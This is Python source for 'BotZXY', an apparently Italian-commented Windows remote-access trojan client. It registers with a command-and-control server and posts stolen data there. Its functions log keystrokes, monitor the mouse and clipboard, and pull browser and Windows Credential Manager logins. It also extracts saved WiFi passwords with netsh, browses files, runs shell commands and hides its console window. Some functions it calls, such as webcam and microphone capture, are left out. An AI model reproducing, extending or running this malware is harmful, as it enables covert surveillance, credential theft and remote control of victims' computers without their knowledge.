#!/usr/bin/env python3
# BotZXY - Windows Client POTENZIATO

import requests
import platform
import socket
import os
import sys
import time
import json
import base64
import subprocess
import threading
from datetime import datetime
import io
import win32api
import win32con
import win32clipboard
import ctypes
from ctypes import wintypes

# ============ CONFIGURAZIONE ============
C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI
DEVICE_ID = socket.gethostname() + "_" + platform.node()[:8]
POLL_INTERVAL = 3
BOT_NAME = "BotZXY"

# ============ CLIENT POTENZIATO ============
class BotZXYClient:
    def __init__(self):
        self.device_id = DEVICE_ID
        self.c2_url = C2_URL
        self.running = True
        self.bot_name = BOT_NAME
        self.session = requests.Session()
        self.keylog_buffer = []
        self.mouse_thread = None
        self.keylog_thread = None
        self.clipboard_thread = None
        self.wifi_thread = None
        
    def register(self):
        data = {
            'device_id': self.device_id,
            'platform': platform.system().lower(),
            'hostname': socket.gethostname(),
            'os_version': platform.version(),
            'cpu': platform.processor()
        }
        try:
            response = self.session.post(f"{self.c2_url}/api/register", json=data, timeout=10)
            if response.status_code == 200:
                print(f"[+] {self.bot_name} Registered: {self.device_id}")
                return True
        except Exception as e:
            print(f"[-] Registration error: {e}")
        return False
    
    # ============ KEYLOGGER ============
    def start_keylogger(self):
        """Avvia il keylogger in background"""
        try:
            import keyboard
            keyboard.on_press(self._keylogger_callback)
            print("[+] Keylogger avviato")
        except ImportError:
            print("[-] Keyboard module non installato, keylogger disabilitato")
    
    def _keylogger_callback(self, event):
        """Callback per i tasti premuti"""
        try:
            key = event.name
            timestamp = datetime.now().isoformat()
            self.keylog_buffer.append({'key': key, 'timestamp': timestamp})
            
            # Invia ogni 30 tasti o 10 secondi
            if len(self.keylog_buffer) >= 30:
                self._send_keylog()
        except:
            pass
    
    def _send_keylog(self):
        """Invia i tasti al C2"""
        if not self.keylog_buffer:
            return
        
        data = {
            'keys': json.dumps(self.keylog_buffer),
            'timestamp': datetime.now().isoformat()
        }
        try:
            self.session.post(f"{self.c2_url}/api/keylog/{self.device_id}", json=data, timeout=10)
            self.keylog_buffer = []
        except:
            pass
    
    # ============ PASSWORD GRABBER ============
    def grab_passwords(self):
        """Cattura le password salvate dal browser e dal sistema"""
        passwords = []
        
        # Chrome/Edge passwords
        try:
            import sqlite3
            import shutil
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            
            chrome_path = os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
            edge_path = os.path.expanduser('~') + '\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
            
            for browser, path in [('Chrome', chrome_path), ('Edge', edge_path)]:
                if os.path.exists(path):
                    temp_path = os.path.join(os.environ['TEMP'], 'logins_temp.db')
                    shutil.copy2(path, temp_path)
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                    rows = cursor.fetchall()
                    conn.close()
                    os.remove(temp_path)
                    
                    for row in rows:
                        if row[0] and row[1] and row[2]:
                            passwords.append({
                                'browser': browser,
                                'url': row[0],
                                'username': row[1],
                                'password': '[CRYPTED]'
                            })
        except:
            pass
        
        # Windows Credential Manager
        try:
            import win32cred
            creds = win32cred.CredEnumerate(None, 0)
            for cred in creds:
                if cred['Type'] == 1:  # Generic
                    passwords.append({
                        'browser': 'Windows Credential',
                        'url': cred['TargetName'],
                        'username': cred['UserName'],
                        'password': '[CRYPTED]'
                    })
        except:
            pass
        
        if passwords:
            self.session.post(f"{self.c2_url}/api/passwords/{self.device_id}", 
                            json={'passwords': passwords}, timeout=30)
        
        return passwords
    
    # ============ MOUSE/TOUCH INTERACTION ============
    def start_mouse_monitor(self):
        """Monitora le interazioni del mouse in background"""
        self.mouse_thread = threading.Thread(target=self._monitor_mouse, daemon=True)
        self.mouse_thread.start()
    
    def _monitor_mouse(self):
        """Monitora click e movimenti del mouse"""
        last_pos = None
        last_click_time = 0
        
        while self.running:
            try:
                # Posizione corrente
                x, y = win32api.GetCursorPos()
                now = time.time()
                
                # Click sinistro
                if win32api.GetKeyState(win32con.VK_LBUTTON) & 0x8000:
                    if now - last_click_time > 0.5:  # Debounce
                        self._send_mouse_interaction('click', x, y, 'left')
                        last_click_time = now
                
                # Click destro
                elif win32api.GetKeyState(win32con.VK_RBUTTON) & 0x8000:
                    if now - last_click_time > 0.5:
                        self._send_mouse_interaction('click', x, y, 'right')
                        last_click_time = now
                
                # Movimento (ogni 50 pixel)
                if last_pos:
                    dx = abs(x - last_pos[0])
                    dy = abs(y - last_pos[1])
                    if dx + dy > 50:
                        self._send_mouse_interaction('move', x, y)
                        last_pos = (x, y)
                else:
                    last_pos = (x, y)
                
                time.sleep(0.05)
            except:
                time.sleep(0.5)
    
    def _send_mouse_interaction(self, action, x, y, button='left'):
        """Invia interazione mouse al C2"""
        data = {
            'action': action,
            'x': x,
            'y': y,
            'button': button,
            'timestamp': datetime.now().isoformat()
        }
        try:
            self.session.post(f"{self.c2_url}/api/mouse/{self.device_id}", json=data, timeout=5)
        except:
            pass
    
    # ============ CLIPBOARD MONITOR ============
    def start_clipboard_monitor(self):
        """Monitora la clipboard in background"""
        self.clipboard_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
        self.clipboard_thread.start()
    
    def _monitor_clipboard(self):
        """Cattura i cambiamenti della clipboard"""
        last_content = None
        
        while self.running:
            try:
                win32clipboard.OpenClipboard()
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                    content = win32clipboard.GetClipboardData()
                    if content and content != last_content:
                        self._send_clipboard(content)
                        last_content = content
                win32clipboard.CloseClipboard()
                time.sleep(2)
            except:
                time.sleep(5)
    
    def _send_clipboard(self, content):
        """Invia clipboard al C2"""
        try:
            self.session.post(f"{self.c2_url}/api/clipboard/{self.device_id}", 
                            json={'content': content[:5000]}, timeout=10)  # Limite 5000 caratteri
        except:
            pass
    
    # ============ WiFi NETWORKS ============
    def grab_wifi_networks(self):
        """Cattura le reti WiFi salvate"""
        networks = []
        try:
            output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, stderr=subprocess.DEVNULL)
            lines = output.split('\n')
            for line in lines:
                if 'All User Profile' in line or 'Profilo utente' in line:
                    ssid = line.split(':')[-1].strip()
                    if ssid:
                        networks.append({'ssid': ssid, 'password': self._get_wifi_password(ssid)})
        except:
            pass
        
        if networks:
            self.session.post(f"{self.c2_url}/api/wifi/{self.device_id}", 
                            json={'networks': networks}, timeout=30)
        return networks
    
    def _get_wifi_password(self, ssid):
        """Ottiene la password di una rete WiFi"""
        try:
            output = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', 
                                           shell=True, text=True, stderr=subprocess.DEVNULL)
            for line in output.split('\n'):
                if 'Key Content' in line or 'Contenuto chiave' in line:
                    return line.split(':')[-1].strip()
        except:
            pass
        return ''
    
    # ============ FILE BROWSER ============
    def list_files(self, path='C:\\'):
        """Lista i file e cartelle"""
        files = []
        try:
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                try:
                    is_dir = os.path.isdir(full_path)
                    size = os.path.getsize(full_path) if not is_dir else 0
                    files.append({
                        'name': item,
                        'path': full_path,
                        'is_dir': is_dir,
                        'size': size,
                        'modified': datetime.fromtimestamp(os.path.getmtime(full_path)).isoformat()
                    })
                except:
                    pass
        except:
            pass
        
        if files:
            self.session.post(f"{self.c2_url}/api/files/{self.device_id}", 
                            json={'path': path, 'files': files}, timeout=30)
        return files
    
    # ============ COMANDI ESPANDIBILI ============
    def execute_command(self, cmd_id, command, params):
        """Esegue i comandi ricevuti dal C2"""
        print(f"[+] {self.bot_name} Executing: {command} {params}")
        result = ""
        status = "executed"
        
        try:
            if command == "screenshot":
                result = self.take_screenshot()
                self.upload_screenshot(result)
                
            elif command == "webcam":
                result = self.take_webcam()
                self.upload_webcam(result)
                
            elif command == "mic":
                duration = int(params.split('=')[1]) if '=' in params else 10
                result = self.record_microphone(duration)
                self.upload_mic(result)
                
            elif command == "contacts":
                result = self.get_contacts()
                self.upload_contacts(result)
                
            elif command == "location":
                result = self.get_location()
                
            elif command == "clipboard":
                result = self.get_clipboard()
                self._send_clipboard(result)
                
            elif command == "execute":
                result = self.execute_shell(params)
                
            elif command == "download":
                result = self.download_file(params)
                
            elif command == "upload":
                result = self.upload_file(params)
                
            elif command == "uninstall":
                self.uninstall()
                
            # ============ NUOVI COMANDI ============
            elif command == "keylogger_start":
                self.start_keylogger()
                result = "Keylogger avviato"
                
            elif command == "keylogger_stop":
                self._send_keylog()
                result = "Keylogger arrestato"
                
            elif command == "grab_passwords":
                result = json.dumps(self.grab_passwords())
                
            elif command == "grab_wifi":
                result = json.dumps(self.grab_wifi_networks())
                
            elif command == "list_files":
                path = params if params else 'C:\\'
                result = json.dumps(self.list_files(path))
                
            elif command == "mouse_monitor_start":
                self.start_mouse_monitor()
                result = "Mouse monitor avviato"
                
            elif command == "clipboard_monitor_start":
                self.start_clipboard_monitor()
                result = "Clipboard monitor avviato"
                
            else:
                result = f"Unknown command: {command}"
                status = "failed"
                
        except Exception as e:
            result = f"ERROR: {str(e)}"
            status = "failed"
            print(f"[-] Command error: {e}")
        
        self.send_result(cmd_id, result, status)
    
    # ============ ALTRE FUNZIONI (già implementate) ============
    # ... (take_screenshot, take_webcam, record_microphone, ecc.)
    # Vedi il codice precedente per queste funzioni
    
    def run(self):
        print(f"[+] {self.bot_name} Client starting: {self.device_id}")
        
        # Avvia servizi in background
        self.start_keylogger()
        self.start_mouse_monitor()
        self.start_clipboard_monitor()
        
        # Registrazione
        if not self.register():
            print("[-] Registration failed, retrying in 60 seconds...")
            time.sleep(60)
            return
        
        print(f"[+] {self.bot_name} running, polling every {POLL_INTERVAL}s")
        
        # Main loop
        while self.running:
            try:
                self.poll_commands()
                time.sleep(POLL_INTERVAL)
                
                # Invia keylog periodicamente
                if len(self.keylog_buffer) > 0:
                    self._send_keylog()
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[-] Main loop error: {e}")
                time.sleep(30)
        
        print("[+] BotZXY Client stopped")

if __name__ == "__main__":
    if '--hidden' in sys.argv:
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    client = BotZXYClient()
    client.run()